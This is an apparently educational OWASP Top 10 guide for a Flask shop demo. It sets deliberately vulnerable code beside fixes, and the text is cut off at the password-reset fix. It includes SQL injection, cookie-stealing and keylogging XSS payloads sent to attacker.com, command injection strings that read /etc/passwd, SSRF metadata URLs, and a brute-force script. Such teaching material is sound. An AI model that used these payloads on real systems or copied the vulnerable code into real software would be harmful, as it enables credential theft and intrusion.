# ShopSecure — OWASP Top 10 Vulnerability Documentation

**Project  :** ShopSecure | TCS-ION Industry Project
**Standard :** OWASP Top 10 (2021-2025)
**Version  :**
**Date     :**

---

## Vulnerability 1 — SQL Injection (A03: Injection)

### 1. Vulnerability Name
**SQL Injection** | OWASP A03:— Injection
### Vulnerable Mode Demonstration

### 2. Description
SQL Injection occurs when user-supplied input is directly inserted into a SQL query string without
any sanitization or parameterization. The database cannot distinguish between the attacker's
injected SQL code and the legitimate query, so it executes both. This allows an attacker to
read, modify, or delete data — often with a single request from a normal web browser.

### 3. Vulnerable Code Example
```python
# File: app.py — Route: /search — VULNERABLE MODE
# The user's search query 'q' is directly placed inside the SQL string.
# There is NO escaping, NO parameterization — raw user input becomes SQL code.

@app.route("/search")
def search():
    q = request.args.get("q", "").strip()
    # ══════════════════════════════════════════════════════════════
    # A03 VULNERABILITY: f-string SQL concatenation
    # If q = "' UNION SELECT username,password FROM users--"
    # The full executed SQL becomes a credential-dumping UNION attack
    # ══════════════════════════════════════════════════════════════
    sql = f"SELECT * FROM products WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'"
    products = get_db().execute(sql).fetchall()
    return render_template("home.html", products=products, search_query=q)
```

### 4. Attack Payload Example
Type the following into the search bar (or paste into the URL):
```sql
%' UNION SELECT 1,username,password,email,role,address,phone,created_at,last_login FROM users--
```

![SQL Injection](../screenshots/sql_injection/sql_injection_pyaload_query.png)
![SQL Injection Success](../screenshots/sql_injection/sql_injection_success.png)

URL-encoded version:
```
http://localhost:5000/search?q=%25%27+UNION+SELECT+1%2Cusername%2Cpassword%2Cemail%2Crole%2Caddress%2Cphone%2Ccreated_at%2Clast_login+FROM+users--
```

The product grid will now display all usernames, password hashes, and emails from the database.

### 5. Impact
- Full extraction of all user credentials (usernames, passwords, emails, roles)
- Authentication bypass — login as admin without knowing the password
- Data modification or complete deletion (DROP TABLE in some configurations)
- In SQL Server: OS command execution via `xp_cmdshell`
- Complete database compromise in a **single HTTP request**

### 6. Secure Fix Explanation
Use **parameterized queries** (also called prepared statements). The user input is passed as a
separate **parameter** — it is NEVER part of the SQL string itself. The database driver handles
all necessary escaping, making injection structurally impossible. The `?` placeholder ensures
the input is always treated as data, never as code.

### 7. Secure Code Example
```python
# File: app.py — Route: /search — SECURE MODE
# Input is passed as a parameter — structurally cannot be interpreted as SQL code.

@app.route("/search")
def search():
    q = request.args.get("q", "").strip()
    # ══════════════════════════════════════════════════════════════
    # A03 FIX: Parameterized query — ? placeholders
    # No matter what q contains, it is treated as plain TEXT, not SQL
    # The UNION payload becomes a literal search string, not a query
    # ══════════════════════════════════════════════════════════════
    products = query(
        "SELECT * FROM products WHERE name LIKE ? OR description LIKE ?",
        (f"%{q}%", f"%{q}%")
    )
    sec_log(f"[SEARCH] user={session.get('username','anon')} q={q[:100]}")
    return render_template("home.html", products=products, search_query=q)
```

### Secure Mode Demonstration

![SQL Injection Blocked](../screenshots/sql_injection/sql_injection_blocked.png)
### 8. Real-World Relevance
- **Heartland Payment Systems (2008):** SQLi exposed 130 million credit card records — $140M in damages
- **TalkTalk UK (2015):** SQLi exposed 156,000 customer records — £400,000 ICO fine
- **Equifax (2017):** Chain of vulnerabilities starting with injection — 147 million Americans exposed — $700M settlement
- SQLi remains the #1 most tested vulnerability in web application penetration testing engagements

---

## Vulnerability 2 — Stored XSS (A03: Injection)

### 1. Vulnerability Name
**Stored Cross-Site Scripting (XSS)** | OWASP A03: — Injection

### 2. Description
Stored XSS occurs when an attacker injects a malicious JavaScript payload into the application
database through a user input field (like a comment, review, or profile field). Every future
visitor who loads the affected page automatically executes the attacker's script in their browser.
The script runs with the same privileges as the victim's browser session — giving full access to
their cookies, session tokens, and ability to perform actions on their behalf.

### 3. Vulnerable Code Example
```python
# File: app.py — Comment/Review feature — VULNERABLE MODE
# Comment saved directly without escaping
# Template uses | safe — bypasses Jinja2 auto-escaping

@app.route("/product/<int:pid>/comment", methods=["POST"])
def add_comment(pid):
    comment = request.form.get("comment", "")
    user_id = session["user_id"]
    # ══════════════════════════════════════════════════════════════
    # A03 VULNERABILITY: Raw HTML/JavaScript stored directly in database
    # Malicious <script> tag is saved as-is, with no sanitization
    # ══════════════════════════════════════════════════════════════
    query("INSERT INTO comments(product_id, user_id, body) VALUES(?,?,?)",
          (pid, user_id, comment), commit=True)  # Raw input stored

# In the Jinja2 template — VULNERABLE:
# {{ comment.body | safe }}   ← | safe disables auto-escaping — XSS fires!
```

### 4. Attack Payload Example
In any comment or review input field, submit:

**Session Hijack (steal cookies):**
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**Silent cookie exfiltration:**
```html
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

**Page defacement:**
```html
<script>document.body.innerHTML='<h1 style="color:red">HACKED BY XSS</h1>'</script>
```

**Keylogger:**
```html
<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>
```

### 5. Impact
- Session hijacking — steal authenticated session cookies and take over accounts
- Account takeover without knowing the victim's password
- Keylogging — capture every keystroke (passwords, card numbers, PINs)
- Cryptocurrency mining using victims' browser CPU resources
- Phishing — redirect users to a fake login page to harvest credentials
- Worm propagation — XSS that spreads to every profile it touches (Twitter, 2010)
- Defacement — corrupt the website visually for all visitors

### 6. Secure Fix Explanation
**Jinja2 auto-escapes by default** — `<script>` becomes `&lt;script&gt;` which displays as visible
text and never executes. The critical rule: **never use `| safe` on user-supplied data**. Additionally,
implement a Content-Security-Policy (CSP) header to prevent inline script execution even if escaping
is somehow bypassed. Sanitize and length-limit all text inputs server-side.

### 7. Secure Code Example
```python
# File: app.py — SECURE MODE
# Jinja2 auto-escaping is active (default) — no | safe used on user content

@app.route("/product/<int:pid>/comment", methods=["POST"])
def add_comment(pid):
    from markupsafe import escape
    comment = request.form.get("comment", "").strip()[:500]  # Length limit
    # ══════════════════════════════════════════════════════════════
    # A03 FIX: Explicit escape + length limit before storage
    # Jinja2 template uses {{ comment.body }} WITHOUT | safe
    # <script> → &lt;script&gt; → displays as text, never executes
    # ══════════════════════════════════════════════════════════════
    safe_comment = str(escape(comment))  # Explicit sanitization
    query("INSERT INTO comments(product_id, user_id, body) VALUES(?,?,?)",
          (pid, session["user_id"], safe_comment), commit=True)

# Secure template renders without | safe:
# {{ comment.body }}   ← auto-escaped by Jinja2

# Secure mode also sets Content-Security-Policy header:
# resp.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self';"
```

### 8. Real-World Relevance
- **British Airways (2018):** Magecart XSS on payment page — 380,000 customers' card data stolen — £20M GDPR fine
- **eBay (2015):** Stored XSS in product listings embedded malware for buyers
- **Twitter XSS Worm (2010):** Spread to 500,000+ accounts in under one hour via profile bio field
- **Samy Worm (2005):** First major XSS worm — infected 1 million MySpace profiles in 20 hours

---

## Vulnerability 3 — Broken Authentication (A07: Identification and Authentication Failures)

### 1. Vulnerability Name
**Broken Authentication** | OWASP A07: — Identification and Authentication Failures

### 2. Description
Broken Authentication covers weaknesses in login systems that allow attackers to compromise
passwords, session tokens, or authentication logic. The most common forms demonstrated here are:
- **User enumeration:** Revealing whether a specific username exists
- **No account lockout:** Allowing unlimited password guessing (brute-force)
- **Weak session secret:** Allowing forging of authenticated session cookies
- **Weak password hashing:** Making cracked passwords available quickly

### 3. Vulnerable Code Example
```python
### Vulnerable Mode Demonstration

![User Enumeration](../screenshots/authentication/user_enumeration.png)
# File: app.py — Route: /login — VULNERABLE MODE

app.config["SECRET_KEY"] = "secret"  # A05/A07: Hardcoded, trivially guessable key

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password", "").encode()

    user = query("SELECT * FROM users WHERE username=?", (username,), one=True)

    if not user:
        # ══════════════════════════════════════════════════════════
        # A07 VULNERABILITY: User enumeration
        # This distinct message tells the attacker the username DOES NOT exist.
        # Combined with the message below, valid usernames can be confirmed.
        # ══════════════════════════════════════════════════════════
        flash(f"Username '{username}' not found.", "error")
        return render_template("login.html")

    md5_pw = hashlib.md5(password).hexdigest()
    if md5_pw != user["password"]:
        # ══════════════════════════════════════════════════════════
        # A07 VULNERABILITY: Separate "wrong password" message
        # Confirms the username IS valid — attacker can now brute-force
        # No rate limiting, no lockout — unlimited attempts allowed
        # ══════════════════════════════════════════════════════════
        flash("Incorrect password.", "error")
        return render_template("login.html")
```

### 4. Attack Payload Example
**Step 1 — Enumerate valid usernames:**
```
POST /login  →  username=admin       →  "Incorrect password."  ← Username EXISTS
POST /login  →  username=xyz123      →  "Username 'xyz123' not found."  ← Does NOT exist
```
Attacker now has confirmed username: `admin`

**Step 2 — Brute-force with confirmed username:**
```python
# Simple Python brute-force (no lockout in vulnerable mode):
import requests
wordlist = ["password", "admin123", "letmein", "qwerty", "123456"]
for pw in wordlist:
    r = requests.post("http://localhost:5000/login",
                      data={"username": "admin", "password": pw})
    if "Welcome" in r.text:
        print(f"Password found: {pw}")
        break
```

**Step 3 — Forge session cookie with known SECRET_KEY:**
```python
# With SECRET_KEY = "secret", forge an admin session cookie:
from flask.sessions import SecureCookieSessionInterface
# Any attacker knowing the key can craft: {"user_id": 1, "role": "admin"}
```

### 5. Impact
- Confirmed username list enables efficient targeted credential stuffing
- Brute-force attack succeeds with no lockout protection
- Predictable SECRET_KEY allows forging admin-level session tokens
- Full account takeover without knowing the real password

### 6. Secure Fix Explanation
- Use a **single, identical error message** for all login failures (username not found AND wrong password)
- Generate a **cryptographically random SECRET_KEY** (minimum 32 bytes, stored in environment variable)
- Implement **account lockout** or rate limiting after N failed attempts
- **Log all authentication events** with timestamps and source IP for monitoring

### 7. Secure Code Example
```python
# File: app.py — Route: /login — SECURE MODE

import secrets
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", secrets.token_hex(32))  # 256-bit random

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password", "").encode()
    user = query("SELECT * FROM users WHERE username=?", (username,), one=True)

    pw_match = False
    if user and BCRYPT_AVAILABLE and user["password"].startswith("$2b$"):
        pw_match = bcrypt.checkpw(password, user["password"].encode())

    if not user or not pw_match:
        # ══════════════════════════════════════════════════════════
        # A07 FIX: Identical message for both cases — no enumeration
        # Attacker cannot determine if username exists or not
        # ══════════════════════════════════════════════════════════
        sec_log(f"[LOGIN-FAIL] username={username} ip={request.remote_addr}")
        flash("Invalid credentials.", "error")  # Generic — same always
        return render_template("login.html")

    sec_log(f"[LOGIN-OK] user={username} ip={request.remote_addr}")
    # Regenerate session to prevent session fixation
    session.clear()
    session["user_id"]  = user["id"]
    session["username"] = user["username"]
    session["role"]     = user["role"]
```

### 8. Real-World Relevance
- **Snapchat (2014):** User enumeration API exposed 4.6 million usernames and phone numbers
- **LinkedIn (2012):** 117 million MD5 passwords leaked — 90%+ cracked within 72 hours
- **Dunkin Donuts (2018-2019):** Credential stuffing attack succeeded due to zero account lockout
- **Rockstar Games (2022):** Session token theft led to GTA VI source code leak

---

## Vulnerability 4 — Broken Access Control (A01: Broken Access Control)

### 1. Vulnerability Name
**Broken Access Control (IDOR + Missing Function-Level Authorization)** | OWASP A01

### 2. Description
Broken Access Control is the #1 OWASP vulnerability. It occurs when the application does not
properly enforce that users can only access resources and actions they are authorized for.
Two forms are demonstrated:
- **IDOR (Insecure Direct Object Reference):** Changing an ID in the URL to access another user's data
- **Missing Function-Level Access Control:** Accessing admin pages without having admin role

### 3. Vulnerable Code Example
```python
# File: app.py — VULNERABLE MODE

# ═══════════════════════════════════════════════════════════════
# A01 VULNERABILITY 1: IDOR on orders — no ownership check
# Any logged-in user can view any other user's order
# ═══════════════════════════════════════════════════════════════
@app.route("/orders/<int:oid>")
@login_required
def order_detail(oid):
    # BUG: Fetches order by ID only — no check that it belongs to current user
    order = query("SELECT * FROM orders WHERE id=?", (oid,), one=True)
    return render_template("orders.html", order=order)

# ═══════════════════════════════════════════════════════════════
# A01 VULNERABILITY 2: Admin page with NO authentication check
# Any visitor (even logged out) can access /admin
# ═══════════════════════════════════════════════════════════════
@app.route("/admin")
def admin():
    # BUG: No login check, no role check — completely open
    users = query("SELECT * FROM users ORDER BY id")
    return render_template("admin.html", users=users)
```

### 4. Attack Payload Example
```
# IDOR — view another user's private order (just change the number):
http://localhost:5000/orders/1
http://localhost:5000/orders/2
http://localhost:5000/orders/3

# IDOR — view another user's private profile including password hash:
http://localhost:5000/profile/1    ← Admin profile visible to Alice
http://localhost:5000/profile/2    ← Bob's profile visible to Alice

# Admin panel — no login required:
http://localhost:5000/admin
(Returns full user table with emails, roles, and password hashes)
```
### Vulnerable Mode Demonstration

![Broken Access Control](../screenshots/broken_access_control/access_control_success.png)
### 5. Impact
- View private orders, home addresses, and financial data of ALL users
- Access admin panel — see all users, all password hashes
- In write-enabled scenarios: modify or delete other users' data
- Complete customer data breach with zero hacking tools needed
- A junior developer clicking the wrong URL can expose all customer data

### 6. Secure Fix Explanation
**Always verify ownership server-side.** Add `AND user_id = current_user_id` to every database
query that fetches user-specific resources. For admin or privileged routes, use a decorator that
checks the user's role before allowing access. Never trust a client-supplied ID alone.

### 7. Secure Code Example
```python
### Secure Mode Demonstration

![Broken Access Control Blocked](../screenshots/broken_access_control/access_control_blocked.png)
# File: app.py — SECURE MODE

# ═══════════════════════════════════════════════════════════════
# A01 FIX 1: Order detail with mandatory ownership check
# ═══════════════════════════════════════════════════════════════
@app.route("/orders/<int:oid>")
@login_required
def order_detail(oid):
    uid = session["user_id"]
    # FIX: BOTH id AND user_id must match — attacker's ID won't pass
    order = query("SELECT * FROM orders WHERE id=? AND user_id=?", (oid, uid), one=True)
    if not order:
        sec_log(f"[IDOR-BLOCKED] user={uid} tried order={oid} ip={request.remote_addr}")
        abort(403)  # Access denied
    return render_template("orders.html", order=order)

# ═══════════════════════════════════════════════════════════════
# A01 FIX 2: Admin with role-based access control decorator
# ═══════════════════════════════════════════════════════════════
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("user_id") or session.get("role") != "admin":
            sec_log(f"[UNAUTH-ADMIN] user={session.get('user_id')} ip={request.remote_addr}")
            abort(403)  # Access denied — not admin
        return f(*args, **kwargs)
    return decorated

@app.route("/admin")
@admin_required   # FIX: Only role=admin users can reach this
def admin():
    users = query("SELECT * FROM users ORDER BY id")
    return render_template("admin.html", users=users)
```

### 8. Real-World Relevance
- **Facebook (2018):** IDOR in photo API exposed private photos of 6.8 million users
- **Parler (2021):** No access control on media download API — all 70TB of data harvested
- **Venmo (2019):** Public API with no access control — 207 million transactions scraped
- **Australian COVID Check-in App (2021):** IDOR exposed personal health records of millions

---

## Vulnerability 5 — Security Misconfiguration (A05: Security Misconfiguration)

### 1. Vulnerability Name
**Security Misconfiguration** | OWASP A05: — Security Misconfiguration

### 2. Description
Security Misconfiguration covers insecure default settings, unnecessary features left enabled,
verbose error messages, or exposed sensitive configuration data. The most dangerous Flask-specific
example is running with `DEBUG=True` in production — this enables the Werkzeug interactive debugger
which allows any visitor to execute **arbitrary Python code** on the server by clicking a button
on an error page. Combined with a hardcoded `SECRET_KEY`, an attacker gains complete server control.

### 3. Vulnerable Code Example
```python
# File: app.py — VULNERABLE CONFIGURATION

app.config.update(
    # ══════════════════════════════════════════════════════════════
    # A05 VULNERABILITY 1: Hardcoded, predictable SECRET_KEY
    # With this key, an attacker can forge any session cookie
    # ══════════════════════════════════════════════════════════════
    SECRET_KEY = "secret",

    # ══════════════════════════════════════════════════════════════
    # A05 VULNERABILITY 2: DEBUG=True in production
    # Werkzeug debugger activated — clicking ">" on any error
    # page executes arbitrary Python in the server process (RCE)
    # ══════════════════════════════════════════════════════════════
    DEBUG = True,
)

# ══════════════════════════════════════════════════════════════
# A05 VULNERABILITY 3: Debug endpoint exposing all sensitive config
### Vulnerable Mode Demonstration

![Security Misconfiguration](../screenshots/misc/security_misconfiguration.png)
# No authentication required — any visitor sees everything
# ══════════════════════════════════════════════════════════════
@app.route("/debug")
def debug_page():
    debug_data = [
        ("Flask SECRET_KEY",        app.config["SECRET_KEY"]),
        ("Environment Variables",   dict(os.environ)),   # May contain DB passwords, API keys
        ("Session Contents",        dict(session)),       # User IDs, role, tokens
        ("Full Flask Config",       dict(app.config)),    # All settings
        ("Database File Path",      app.config["DATABASE"]),
    ]
    return render_template("debug.html", debug_data=debug_data)
```

### 4. Attack Payload Example
```
# Step 1: Access debug endpoint — no login required
http://localhost:5000/debug

# Attacker sees:
# ┌─ SECRET_KEY ─────────────────────────────────────────┐
# │ "secret"                                              │
# └───────────────────────────────────────────────────────┘
# ┌─ Environment Variables ──────────────────────────────┐
# │ DATABASE_PASSWORD = "db_prod_p@ss"                   │
# │ AWS_SECRET_KEY    = "wJalrXUtn..."                   │
# └───────────────────────────────────────────────────────┘

# Step 2: With SECRET_KEY known, forge admin session cookie:
python3 -c "
import itsdangerous
s = itsdangerous.URLSafeTimedSerializer('secret')
print(s.dumps({'user_id': 1, 'role': 'admin', 'username': 'admin'}))
"

# Step 3: With DEBUG=True, trigger any error → Werkzeug debugger appears
# Click '>' on any line → Execute Python in server process = Full RCE
```

### 5. Impact
- SECRET_KEY exposure → forge admin-level session cookies without a password
- DEBUG=True + Werkzeug debugger → Remote Code Execution on the server
- Environment variable exposure → cloud credentials, database passwords, API keys
- Database path exposure → direct file download if web server is misconfigured
- All data needed for chaining further attacks available in one request

### 6. Secure Fix Explanation
- Set `DEBUG = False` unconditionally in production
- Generate `SECRET_KEY` using `secrets.token_hex(32)` and store in environment variable (never in code)
- Remove or disable all debug/diagnostic endpoints in non-development environments
- Return generic error pages — never expose stack traces or internal details to users
- Apply security headers on every response

### 7. Secure Code Example
```python
# File: app.py — SECURE CONFIGURATION

import secrets

app.config.update(
    # FIX: SECRET_KEY from environment — never hardcoded, always random
    SECRET_KEY              = os.environ.get("SECRET_KEY", secrets.token_hex(32)),
    DEBUG                   = False,    # FIX: NEVER True in production
    TESTING                 = False,
    SESSION_COOKIE_HTTPONLY = True,     # Prevents JS access to session cookie
    SESSION_COOKIE_SAMESITE = "Lax",   # CSRF mitigation
    SESSION_COOKIE_SECURE   = True,    # Only over HTTPS
)

# FIX: Debug endpoint returns 404 in secure mode — does not exist
@app.route("/debug")
def debug_page():
    if not is_vulnerable():
        abort(404)   # Page simply does not exist in production

# FIX: Generic error handler — no internal details exposed
@app.errorhandler(500)
def server_error(e):
    sec_log(f"[ERROR-500] {e} path={request.path}")
    return "<h1>Something went wrong. Please try again later.</h1>", 500

# FIX: Security headers on every response
@app.after_request
def set_security_headers(resp):
    resp.headers["X-Frame-Options"]        = "DENY"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-XSS-Protection"]      = "1; mode=block"
    resp.headers["Content-Security-Policy"]= "default-src 'self';"
    return resp
```

### 8. Real-World Relevance
- **Uber (2016):** AWS credentials hardcoded in GitHub repository — 57 million records breached
- **GitLab (2017):** Debug mode left active in production — internal configuration exposed
- **Capital One (2019):** IAM misconfiguration combined with SSRF — 100 million customers exposed — $80M fine
- **Samsung (2022):** GitLab server with debug mode exposed source code of Galaxy phones

---

## Vulnerability 6 — SSRF (A10: Server-Side Request Forgery)

### 1. Vulnerability Name
**Server-Side Request Forgery (SSRF)** | OWASP A10: — SSRF

### 2. Description
SSRF occurs when the server makes HTTP requests to URLs provided by the user, without validating
whether those URLs point to allowed destinations. An attacker can provide internal network addresses,
cloud metadata endpoints, or localhost services — causing the server to make requests that the
attacker's browser cannot make directly. This is especially dangerous in cloud environments where
the metadata service at `169.254.169.254` provides IAM credentials that can grant full cloud account access.

### 3. Vulnerable Code Example
```python
# File: app.py — Route: /fetch-url — VULNERABLE MODE
# Simulates a common feature: "import product from URL" or "fetch thumbnail"

### Vulnerable Mode Demonstration

![SSRF Demonstration](../screenshots/ssrf/ssrf_success.png)

@app.route("/fetch-url", methods=["POST"])
def fetch_url():
    url = request.form.get("url", "").strip()
    # ══════════════════════════════════════════════════════════════
    # A10 VULNERABILITY: Zero URL validation — fetches ANYTHING
    # Internal IPs, cloud metadata, localhost services — all reachable
    # The server becomes a proxy for internal network access
    # ══════════════════════════════════════════════════════════════
    resp   = requests.get(url, timeout=5)
    result = resp.text
    return render_template("fetch_url.html", result=result)

# BONUS A03: OS Command Injection via shell=True in ping feature
# URL field: "ping:127.0.0.1; cat /etc/passwd"
if url.startswith("ping:"):
    host = url[5:]
    out  = subprocess.check_output(f"ping -c 1 {host}", shell=True)  # RCE!
```

### 4. Attack Payload Example
Enter these into the Fetch URL field at `/fetch-url`:

```
# AWS Cloud Metadata — contains temporary IAM credentials:
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal port scan — detect running services:
http://127.0.0.1:22     → SSH banner (OpenSSH version)
http://127.0.0.1:3306   → MySQL banner
http://127.0.0.1:6379   → Redis (often unauthenticated)
http://127.0.0.1:27017  → MongoDB

# Access internal admin interfaces behind firewall:
http://127.0.0.1:5000/admin   → App's own admin panel (bypasses firewall)

# OS Command Injection (shell=True):
ping:127.0.0.1; id
ping:127.0.0.1; cat /etc/passwd
ping:127.0.0.1; ls /home
```

### 5. Impact
- Retrieve AWS/GCP/Azure cloud metadata including **temporary IAM credentials**
- Gain full cloud account access via stolen metadata tokens
- Scan internal network ports and services not exposed to internet
- Access internal admin interfaces protected by firewall rules
- Read local files (`file:///etc/passwd`) in misconfigured scenarios
- Chain with other vulnerabilities for complete server compromise

### 6. Secure Fix Explanation
Implement strict URL validation with multiple layers:
1. **Allowlist permitted schemes** — only `http` and `https`
2. **Blocklist private IP ranges** — RFC-1918, loopback, and link-local (169.254.x.x)
3. **Disable redirects** — prevent redirect chains from reaching blocked destinations
4. **Use subprocess list syntax** — eliminates shell injection entirely

### 7. Secure Code Example
```python
# File: app.py — Route: /fetch-url — SECURE MODE
import re
from urllib.parse import urlparse

# Blocklist of private/internal IP patterns
PRIVATE_PATTERNS = [
    r"^https?://localhost",
    r"^https?://127\.",
    r"^https?://0\.",
    r"^https?://10\.",
    r"^https?://172\.(1[6-9]|2\d|3[01])\.",
    r"^https?://192\.168\.",
    r"^https?://169\.254\.",    # Cloud metadata (AWS, Azure, GCP)
    r"^https?://::1",
    r"^file://",
    r"^ftp://",
]

@app.route("/fetch-url", methods=["POST"])
def fetch_url():
    url    = request.form.get("url", "").strip()
    parsed = urlparse(url)

    # FIX 1: Only allow http and https
    if parsed.scheme not in ("http", "https"):
        return render_template("fetch_url.html",
                               result="BLOCKED: Only http/https allowed", error=True)

    # FIX 2: Block all private/internal addresses
    if any(re.match(p, url, re.IGNORECASE) for p in PRIVATE_PATTERNS):
        return render_template("fetch_url.html",
                               result="BLOCKED: Internal/private addresses not permitted", error=True)

    # FIX 3: Disable redirects (prevent redirect to blocked destinations)
    resp   = requests.get(url, timeout=5, allow_redirects=False)
    result = resp.text[:1000]  # Limit response size
    sec_log(f"[FETCH-OK] user={session.get('username')} url={url}")
    return render_template("fetch_url.html", result=result)

# FIX 4: subprocess list — shell injection impossible
if url.startswith("ping:"):
    host = url[5:]
    # SECURE: list form — shell metacharacters have no effect
    out = subprocess.check_output(["ping", "-c", "1", host], timeout=5)
```

### 8. Real-World Relevance
- **Capital One (2019):** SSRF on AWS WAF service fetched IAM credentials from metadata — 100M customers, $80M fine
- **GitLab CVE-2021-22214 (2021):** SSRF via import-from-URL feature — CVSS score 8.6
- **Shopify (2020):** SSRF in webhook validation allowed internal server access
- **Yahoo (2019):** SSRF used to access internal infrastructure — significant data exposure

---

## Vulnerability 7 — Cryptographic Failures (A02: Cryptographic Failures)

### 1. Vulnerability Name
**Cryptographic Failures** | OWASP A02: — Cryptographic Failures

### 2. Description
Cryptographic Failures (formerly "Sensitive Data Exposure") covers storing or transmitting sensitive
data with weak or broken cryptography. The most impactful example is storing passwords as MD5 hashes.
MD5 was designed for file integrity checking — it is extremely fast. This is exactly the OPPOSITE of
what password hashing requires. An attacker with a modern GPU can compute **10+ billion MD5 hashes
per second**, cracking common passwords in milliseconds using rainbow tables.

### 3. Vulnerable Code Example
```python
# File: app.py — Route: /register — VULNERABLE MODE
import hashlib

@app.route("/register", methods=["POST"])
def register():
    username = request.form.get("username")
    password = request.form.get("password", "")

    # ══════════════════════════════════════════════════════════════
    # A02 VULNERABILITY: MD5 password hashing
    # 1. MD5 is cryptographically BROKEN (collision vulnerabilities)
    # 2. Designed for speed — 10 billion hashes/second on GPU
    # 3. No per-user SALT — same password = identical hash for all users
    # 4. Rainbow tables exist for ALL common passwords
    # ══════════════════════════════════════════════════════════════
    pw_hash = hashlib.md5(password.encode()).hexdigest()
    # "password"  → always: 5f4dcc3b5aa765d61d8327deb882cf99
    # "admin123"  → always: 0192023a7bbd73250516f069df18b500
    # Both exist in every rainbow table ever published

    query("INSERT INTO users(username, email, password) VALUES(?,?,?)",
          (username, email, pw_hash), commit=True)
```

### 4. Attack Payload Example
```bash
# Step 1: Admin panel (/admin) in Vulnerable Mode shows password hashes
# Copy any MD5 hash from the user table, e.g.:
# 5f4dcc3b5aa765d61d8327deb882cf99

# Step 2: Paste into free online rainbow table:
# https://crackstation.net
# Result: "password" — instant, no GPU needed

# Step 3: GPU cracking with hashcat (10+ billion MD5/second):
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# "password", "123456", "admin123" cracked in under 1 second
# Unique passwords cracked in hours via dictionary + rules

# Step 4: Since passwords are unsalted, identical passwords have IDENTICAL hashes
# One cracked hash reveals ALL users who used the same password
```

### 5. Impact
- All user passwords recoverable within hours — often within seconds for common passwords
- Identical hashes for identical passwords — crack once, compromise many accounts
- No per-user salt means rainbow table attacks work without any computation
- Passwords leaked are typically reused on email, banking, and other services
- One hash file dump can expose an entire user base simultaneously

### 6. Secure Fix Explanation
Use **bcrypt** (or Argon2id, scrypt) for password hashing. bcrypt has a tunable cost factor —
at cost=12, each hash takes approximately **0.3 seconds** on modern hardware. An attacker
cracking bcrypt hashes processes roughly **100 hashes/second** — vs 10 billion for MD5.
bcrypt also includes a built-in **random salt per hash**, making rainbow tables completely
ineffective. Each user's hash is unique even if they have the same password.

### 7. Secure Code Example
```python
# File: app.py — Route: /register — SECURE MODE
import bcrypt

@app.route("/register", methods=["POST"])
def register():
    username = request.form.get("username")
    password = request.form.get("password", "")

    # A04 FIX: Enforce password complexity before hashing
    if len(password) < 8:
        flash("Password must be at least 8 characters.", "error")
        return render_template("register.html")

    # ══════════════════════════════════════════════════════════════
    # A02 FIX: bcrypt with cost factor 12
    # 1. bcrypt auto-generates a random 128-bit salt per user
    # 2. Cost=12 means 2^12 = 4,096 iterations → ~0.3s per hash
    # 3. Attacker can only try ~100 passwords/second (vs 10 billion for MD5)
    # 4. At 100/sec: cracking 1 billion passwords takes ~317 YEARS
    # ══════════════════════════════════════════════════════════════
    pw_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()
    # Result: "$2b$12$LQv3c1yqBWVHxkd0LHAkCO..." (60 chars, includes the salt)

    query("INSERT INTO users(username, email, password) VALUES(?,?,?)",
          (username, email, pw_hash), commit=True)

# Verification at login — Secure Mode:
if bcrypt.checkpw(entered_password.encode(), stored_hash.encode()):
    # Authenticated — bcrypt extracts the embedded salt and re-computes
    pass
```

### 8. Real-World Relevance
- **RockYou (2009):** 32 million passwords stored in **plaintext** — became the world's standard cracking wordlist
- **LinkedIn (2012):** 117 million unsalted MD5 passwords leaked — 90%+ cracked within 72 hours
- **Adobe (2013):** 153 million passwords stored with 3DES (encryption, not hashing) — trivially reversed
- **Yahoo (2016):** 3 billion accounts — MD5 hashing — every hash crackable with modern hardware

---

## Vulnerability 8 — Insecure Design (A04: Insecure Design)

### 1. Vulnerability Name
**Insecure Design** | OWASP A04:— Insecure Design

### 2. Description
Insecure Design covers flaws introduced during the **design phase** — before a single line of
code is written. These are architectural decisions that make security impossible to achieve even
if the implementation is perfectly coded. The classic example: a password reset flow that relies
only on knowing the username — with no token, no email confirmation, no identity proof. An attacker
who knows any username (obtained via enumeration) can immediately take over that account.

### 3. Vulnerable Code Example
```python
# File: app.py — Route: /reset-password — VULNERABLE MODE

@app.route("/reset-password", methods=["POST"])
def reset_password():
    username     = request.form.get("username")
    new_password = request.form.get("new_password")

    # ══════════════════════════════════════════════════════════════
    # A04 VULNERABILITY: Identity not verified AT ALL
    # No login required, no email token, no current password, no MFA
    # Anyone who knows a username can take over that account
    # This is a DESIGN flaw — no amount of good code can fix bad architecture
    # ══════════════════════════════════════════════════════════════
    user = query("SELECT * FROM users WHERE username=?", (username,), one=True)
    if not user:
        flash(f"User '{username}' not found.", "error")  # Also A07: enumeration
        return render_template("reset.html")

    pw_hash = hashlib.md5(new_password.encode()).hexdigest()  # Also A02: MD5
    query("UPDATE users SET password=? WHERE username=?",
          (pw_hash, username), commit=True)
    flash("Password reset successfully!", "success")
```

### 4. Attack Payload Example
```
# Full account takeover in 5 steps — no tools, no hacking:
Step 1: Open http://localhost:5000/reset-password
Step 2: Enter Username: admin
Step 3: Enter New Password: MyNewPassword1
Step 4: Click Submit → Flash message: "Password reset successfully!"
Step 5: Login with admin / MyNewPassword1 → Admin account OWNED

# Total time: under 10 seconds
# Tools required: a web browser
# Skills required: ability to type
```

### 5. Impact
- Complete takeover of any account by anyone who knows the username
- Admin account compromised → full application control, all data accessible
- No forensic evidence — password changed without the legitimate owner's knowledge
- The "security feature" (password reset) becomes the primary attack vector
- Insider threat: any employee with a list of usernames can take over all accounts

### 6. Secure Fix Explanation
A secure password reset must verify identity before allowing a change:
1. **For logged-in users:** Require the current password as confirmation
2. **For "forgot password":** Send a time-limited, single-use, cryptographically random token
   to the registered email address — the token proves identity without revealing the password
3. **Rate limit reset requests** to prevent abuse

### 7. Secure Code Example
```python
# File: app.py — Route: /reset-password — SECURE MODE

